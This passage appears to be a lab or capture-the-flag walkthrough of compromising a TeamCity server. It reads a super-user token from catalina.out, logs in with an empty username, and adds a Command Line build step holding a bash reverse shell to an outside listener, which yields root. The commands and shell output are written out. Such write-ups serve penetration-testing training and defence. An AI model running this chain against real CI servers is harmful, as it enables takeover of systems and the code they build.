
Authentication token is stored in "catalina.out" file.

```
/logs/catalina.out
```

Log in is possible with empty username and authentikation token as "super user".

```
[TeamCity] Super user authentication token: 6862800289410342482 (use empty username with the token as the password to access the server)

```

I've created a Project "manually".

I selected "Build Configurations" and chose "Deployment" so everything we run get's deployed on the underlying server.

Navigated to "Build Steps" and added one. 

I chose "Command Line" and added the following bash reverse shell script to the "custom script" field.

```
/bin/bash -c 'bash -i >& /dev/tcp/192.168.227.246/1337 0>&1'
```

Started up my listener on port 1337.

```
nc -lvnp 1337
```

Pressed on "Deploy" & gained RCE as user "root".

```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.227.246] from (UNKNOWN) [10.114.170.81] 58470
bash: cannot set terminal process group (715): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-114-170-81:/TeamCity/buildAgent/work/d1df6864f98d2599#
```
